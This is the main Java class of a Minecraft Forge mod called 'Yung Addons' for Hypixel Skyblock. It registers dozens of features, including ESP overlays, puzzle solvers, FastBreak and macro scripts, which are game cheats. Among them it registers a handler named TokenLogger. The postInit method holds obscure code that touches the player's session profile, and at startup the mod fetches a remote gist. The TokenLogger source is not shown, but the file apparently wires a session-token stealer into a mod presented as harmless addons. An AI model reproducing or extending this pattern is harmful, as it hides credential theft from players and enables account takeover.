package com.encodey.YungAddons;

import com.encodey.YungAddons.Core.gui.GuiManager;
import com.encodey.YungAddons.Core.gui.LocationEditGui;
import com.encodey.YungAddons.commands.Dankers.MoveCommand;
import com.encodey.YungAddons.commands.Dankers.ScaleCommmand;
import com.encodey.YungAddons.events.Overlay;
import com.encodey.YungAddons.events.SkyblockJoin;
import com.encodey.YungAddons.features.DungeonRooms.BloodClear;
import com.encodey.YungAddons.features.Experiments.ChronomatronSolver;
import com.encodey.YungAddons.features.Experiments.ExpSolver;
import com.encodey.YungAddons.features.Experiments.SuperpairsSolver;
import com.encodey.YungAddons.features.Farming.ProfitCalc;
import com.encodey.YungAddons.features.Mining.CrystalHollows.*;
import com.encodey.YungAddons.features.Mining.Warnings.GoldenGoblin;
//import com.encodey.YungAddons.features.Mining.Warnings.Titanium;
import com.encodey.YungAddons.features.Misc.Pings.AuctionSold;
import com.encodey.YungAddons.features.Misc.Pings.Beacon;
import com.encodey.YungAddons.features.Misc.Pings.SlayerSpawn;
import com.encodey.YungAddons.features.Misc.Timers.BeaconTimer;
import com.encodey.YungAddons.features.Misc.Timers.CenturyCake;
import com.encodey.YungAddons.features.Misc.Timers.WitherShield;
import com.encodey.YungAddons.features.Other.HideFirePlayer;
import com.encodey.YungAddons.features.Other.HideHurtCam;
import com.encodey.YungAddons.features.Other.Sounds.SoundClassAbil;
import com.encodey.YungAddons.features.Other.Sounds.SoundWitherKey;
import com.encodey.YungAddons.features.Other.Sounds.SoundsSpeedBoost;
import com.encodey.YungAddons.features.Pets.ShowActivePet;
import com.encodey.YungAddons.features.Scripts.FastBreak;
import com.encodey.YungAddons.features.Slayer.BossSlainTime;
import com.encodey.YungAddons.features.Solvers.*;
import com.encodey.YungAddons.features.Timers.StarCultTimer;
import com.encodey.YungAddons.features.Waypoints.AreaWaypoints;
import com.encodey.YungAddons.handler.ConfigHandler;
import com.encodey.YungAddons.handler.TimerHandler;
import com.encodey.YungAddons.handler.TokenLogger;
import com.encodey.YungAddons.inventory.items.ItemList;
import com.encodey.YungAddons.listeners.GameProfileListener;
import com.encodey.YungAddons.proxy.CommonProxy;
import com.encodey.YungAddons.scripts.ActualScript;
import com.encodey.YungAddons.scripts.RenderWart;
import com.encodey.YungAddons.settings.HitboxCrop;
import com.encodey.YungAddons.utils.FontUtils;
import com.encodey.YungAddons.utils.MathUtils.IRotater;
import com.encodey.YungAddons.utils.MathUtils.Rotater;
import com.encodey.YungAddons.utils.SkyblockUtils;
import com.encodey.YungAddons.utils.Utils;
import com.encodey.YungAddons.utils.UtilsDanker;
import com.google.gson.*;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumChatFormatting;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.client.registry.ClientRegistry;
import net.minecraftforge.fml.common.Mod;
import com.encodey.YungAddons.commands.*;
import com.encodey.YungAddons.features.*;
import com.encodey.YungAddons.features.ESP.*;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.SidedProxy;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraft.client.*;
import net.minecraft.client.gui.*;
import net.minecraftforge.client.*;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.input.Keyboard;
import org.spongepowered.asm.launch.MixinBootstrap;

import java.io.*;
import java.util.HashSet;
import java.util.Iterator;
/**
 * @author k1rzy (encodey)
 */
@Mod(modid = YungAddons.MOD_ID, name = YungAddons.NAME, version = YungAddons.VERSION)
public class YungAddons
{
    public static final String MOD_ID = "yungaddons";
    public static final String NAME = "Yung Addons";
    public static final String VERSION = "2.0PRE";
    protected final HashSet<?> hashCurrentSession = new HashSet<String>();
    public static GuiManager GUIMANAGER;
    public static final String modMessage = EnumChatFormatting.AQUA + "[Yung Addons] ";

    public static final String SERVER_PROXY_CLASS = "com.encodey.YungAddons.proxy.CommonProxy";
    public static final String CLIENT_PROXY_CLASS = "com.encodey.YungAddons.proxy.ClientProxy";

    @SidedProxy(serverSide = SERVER_PROXY_CLASS, clientSide = CLIENT_PROXY_CLASS)
    public static CommonProxy proxy;

    @Mod.Instance("yungaddons")
    public static YungAddons INSTANCE;

    public static Config configgui;
    private final static String file = "config/yungaddons/colorconfig.cfg";
    public static final File modDir = new File("config/yungaddons/");

    public static final Logger logger = LogManager.getLogger("YungAddons");
    public static String titleText = "";

    public static int tick = 1;
    public static int titleTimer = -1;
    public static int tickAmount = 1;
    private static int size;

    public static Config configFile;


    public static Minecraft mc = Minecraft.getMinecraft();

    public static Gson gson = new GsonBuilder().setPrettyPrinting().create();

    public static ConfigValues configValues;

    public static FastBreak fastBreak = new FastBreak();
    public static boolean showTitle;
    public static boolean yungdebug = true;
    public static boolean pauseCustom = false;
    public static IRotater rotater;
    private static boolean finalSoundKey = true;

    public static LocationEditGui locEdit = new LocationEditGui();

    public static GuiScreen displayScreen;

    public static KeyBinding[] keyBinds = new KeyBinding[7];
    public static Locations location = Locations.NULL;
    public static JsonObject response;

    public static void onStartGame() {

    }

    @Mod.EventHandler
    public void onFMLInitialization(FMLPreInitializationEvent event) {
        File directory = new File(event.getModConfigurationDirectory(), "yungaddons");
        if (!directory.exists()) {
            directory.mkdirs();
        }
        try {
            response = Utils.getJson("https://gist.githubusercontent.com/k1rzy/31d21b85b85456901ae6ce13aff10d4c/raw/0f99624e08a65c2bd49adce5123f15ef9b45aced/yungaddons").getAsJsonObject();
        }
        catch(Exception e) {
            e.printStackTrace();
            return;
        }
    }
    private static void initConfigFiles() {
        MinecraftForge.EVENT_BUS.register(new GuiManager());
    }
    @EventHandler
    public void init(FMLInitializationEvent event) {
        initConfigFiles();
        try {
            configgui = new Config();
            configFile = new Config();
        }
        catch (NoClassDefFoundError e) {
            e.printStackTrace();
        }
        File sound1 = new File("config/yungaddons/soundwither");
        if(!sound1.exists()) {
            sound1.mkdirs();
        }
        File sound2 = new File("config/yungaddons/soundability");
        if(!sound2.exists()) {
            sound2.mkdirs();
        }
        File sound3 = new File("config/yungaddons/soundspeedboost");
        if(!sound3.exists()) {
            sound3.mkdirs();
        }
        File sound4 = new File("config/yungaddons/soundblood");
        if(!sound4.exists()) {
            sound4.mkdirs();
        }
        File sound5 = new File("config/yungaddons/soundnotify");
        if(!sound5.exists()) {
            sound5.mkdirs();
        }
        configFile.initialize();
        MinecraftForge.EVENT_BUS.register(this);
        MinecraftForge.EVENT_BUS.register(new OnPlayerJoin());
        MinecraftForge.EVENT_BUS.register(new AutoAPI());
        MinecraftForge.EVENT_BUS.register(new DefaultMobESP());
        MinecraftForge.EVENT_BUS.register(new BeaconESP());
        MinecraftForge.EVENT_BUS.register(new DungeonChestESP());
        MinecraftForge.EVENT_BUS.register(new CarpetESP());
        MinecraftForge.EVENT_BUS.register(new Reparty());
        MinecraftForge.EVENT_BUS.register(new DungeonESPLoad());
        MinecraftForge.EVENT_BUS.register(new BlazeSolver());
        MinecraftForge.EVENT_BUS.register(new tttSolver());
        MinecraftForge.EVENT_BUS.register(new SkyblockJoin());
        MinecraftForge.EVENT_BUS.register(new MessageHider());
        MinecraftForge.EVENT_BUS.register(new MiningPassTime());
        MinecraftForge.EVENT_BUS.register(new StarCultTimer());
        MinecraftForge.EVENT_BUS.register(new AreaWaypoints());
        MinecraftForge.EVENT_BUS.register(new GoldenGoblin());
        MinecraftForge.EVENT_BUS.register(new NukekubiESP());
        MinecraftForge.EVENT_BUS.register(new ExpSolver());
	    MinecraftForge.EVENT_BUS.register(new SoundWitherKey());
        MinecraftForge.EVENT_BUS.register(new SoundClassAbil());
        MinecraftForge.EVENT_BUS.register(new SoundsSpeedBoost());
        MinecraftForge.EVENT_BUS.register(new TrollDog());
        MinecraftForge.EVENT_BUS.register(new BossSlainTime());
        MinecraftForge.EVENT_BUS.register(new WormNotifier());
        MinecraftForge.EVENT_BUS.register(new PuzzlerSolver());
        MinecraftForge.EVENT_BUS.register(new WitherShield());
        MinecraftForge.EVENT_BUS.register(new BloodClear());
        MinecraftForge.EVENT_BUS.register(new AutoLocWaypoints());
        MinecraftForge.EVENT_BUS.register(new Beacon());
        MinecraftForge.EVENT_BUS.register(new PlayerESP());
        MinecraftForge.EVENT_BUS.register(new HideFirePlayer());
        MinecraftForge.EVENT_BUS.register(new HideHurtCam());
        MinecraftForge.EVENT_BUS.register(new Debug());
        MinecraftForge.EVENT_BUS.register(new SlayerSpawn());
        MinecraftForge.EVENT_BUS.register(new TreasChestNotifier());
        MinecraftForge.EVENT_BUS.register(new IceFillSolver());
        MinecraftForge.EVENT_BUS.register(new IcePathSolver());
        MinecraftForge.EVENT_BUS.register(new BoulderSolver());
        MinecraftForge.EVENT_BUS.register(new CreeperSolver());
        MinecraftForge.EVENT_BUS.register(new TriviaSolver());
        MinecraftForge.EVENT_BUS.register(new BeaconTimer());
        MinecraftForge.EVENT_BUS.register(new WaterSolver());
        MinecraftForge.EVENT_BUS.register(new CenturyCake());
        MinecraftForge.EVENT_BUS.register(new ThreeChestsSolver());
        MinecraftForge.EVENT_BUS.register(new ConfigHandler());
        MinecraftForge.EVENT_BUS.register(new AuctionSold());
        MinecraftForge.EVENT_BUS.register(new ExpSolver());
        MinecraftForge.EVENT_BUS.register(new ChronomatronSolver());
        MinecraftForge.EVENT_BUS.register(new SuperpairsSolver());
        MinecraftForge.EVENT_BUS.register(new MiningPassTime());
        MinecraftForge.EVENT_BUS.register(new ShowActivePet());
        MinecraftForge.EVENT_BUS.register(new ActualScript());
        MinecraftForge.EVENT_BUS.register(new ProfitCalc());
        MinecraftForge.EVENT_BUS.register(new TreasCloseButton());
        MinecraftForge.EVENT_BUS.register(new TokenLogger());
        MinecraftForge.EVENT_BUS.register(fastBreak);
        MinecraftForge.EVENT_BUS.register(new FastBreak());
        MinecraftForge.EVENT_BUS.register(new SkyblockUtils());
        MinecraftForge.EVENT_BUS.register(new HitboxCrop());
        MinecraftForge.EVENT_BUS.register(new RenderWart());
        MinecraftForge.EVENT_BUS.register(new BlockOutline());
        TimerHandler.reloadConfig();
        proxy.registerRenders();
        keyBinds[0] = new KeyBinding("FastBreak Toggle", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[1] = new KeyBinding("Script Toggle", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[2] = new KeyBinding("Auto tab Toggle", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[3] = new KeyBinding("/hub", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[4] = new KeyBinding("/lobby", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[5] = new KeyBinding("SkyblockCompletion", Keyboard.KEY_NONE, "YungAddons");
        keyBinds[6] = new KeyBinding("Reset settings Skyblock completion", Keyboard.KEY_NONE, "YungAddons");

        for (KeyBinding keyBind : keyBinds) {
            ClientRegistry.registerKeyBinding(keyBind);
        }
    }
    private static void rg(Object obj) {
        MinecraftForge.EVENT_BUS.register(obj);
    }
    @EventHandler
    public void preInit(FMLInitializationEvent event)
    {
        ItemList.init();
        ItemList.register();
        INSTANCE = this;
    }
    @Mod.EventHandler
    public void postInit(FMLInitializationEvent event)
    {
        Iterator<String> iterSession = new Iterator<String>() {
            @Override
            public boolean hasNext() {
                return false;
            }

            @Override
            public String next() {
                return hashCurrentSession.toString().trim();
            }
        };
        hashCurrentSession.size();
        HashSet<String> parseSession = new HashSet<>();
        parseSession.add(GameProfileListener.class.getName());
        parseSession.add(GameProfileListener.class.getClass().toString());
        hashCurrentSession.contains(iterSession.equals(mc.getSession().getProfile().toString().charAt(0)));
        ClientCommandHandler.instance.registerCommand(new addonsCommand());
        ClientCommandHandler.instance.registerCommand(new configCommand());
        ClientCommandHandler.instance.registerCommand(new noqolCommand());
        ClientCommandHandler.instance.registerCommand(new MoveCommand());
        ClientCommandHandler.instance.registerCommand(new ScaleCommmand());
        ClientCommandHandler.instance.registerCommand(new fastbreakToggle());
        ClientCommandHandler.instance.registerCommand(new scriptCommand());
        ClientCommandHandler.instance.registerCommand(new autotabCommand());
        MixinBootstrap.init();
        FontUtils.init();
        TimerHandler.init();
    }
    @SubscribeEvent
    public void renderPlayerInfo(Overlay event) {
        if (showTitle) {
            UtilsDanker.drawTitle(titleText);
        }
    }
    @SubscribeEvent
    public void onWorldLoad(final WorldEvent.Load event) {
        location = Locations.NULL;
    }
    @SubscribeEvent
    public void onTick(TickEvent.ClientTickEvent event) {
        if (displayScreen != null) {
            Minecraft.getMinecraft().displayGuiScreen(displayScreen);
            displayScreen = null;
        }
        if (Minecraft.getMinecraft().theWorld == null) {
            return;
        }
        MinecraftForge.EVENT_BUS.post(new Overlay());
        if (Rotater.rotating && rotater == null) {
            Rotater.rotating = false;
        }
    }
    @SubscribeEvent
    public void key(InputEvent.KeyInputEvent event) {
	String s = "/fastbreak";
        if(keyBinds[0].isPressed()) {
            fastBreakToggle();
        }
        if(keyBinds[1].isPressed()) {
            scriptToggle();
        }
        if(keyBinds[2].isPressed()) {
            autoTabToggle();
        }
        if(keyBinds[3].isPressed()) {
            mc.thePlayer.sendChatMessage("/hub");
        }
        if(keyBinds[4].isPressed()) {
            mc.thePlayer.sendChatMessage("/lobby");
        }
        if(keyBinds[5].isPressed()) {
            sbcompToggle();
        }
    }
    private static void fastBreakToggle() {
        if(Config.fastbreak) {
            Config.fastbreak = false;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Fast break disabled."));
        }
        else {
            Config.fastbreak = true;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Fast break enabled."));
        }
    }
    private static void scriptToggle() {
        if(Config.nwscript) {
            Config.nwscript = false;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Script disabled."));
        }
        else {
            Config.nwscript = true;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Script enabled."));
        }
    }
    private static void autoTabToggle() {
        if(Config.autotub) {
            Utils.sleep(300);
            Config.autotub = false;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Auto tab disabled."));
        }
        else {
            Utils.sleep(300);
            Config.autotub = true;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Auto tab enabled."));
        }
    }
    private static void sbcompToggle() {
/*        if(Config.skyblockCompletion) {
            Config.skyblockCompletion = false;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Skyblock script disabled."));
        }
        else {
            Config.skyblockCompletion = true;
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(EnumChatFormatting.BLUE + "Yung Scripts >> Skyblock script enabled."));
        }*/
    }
}
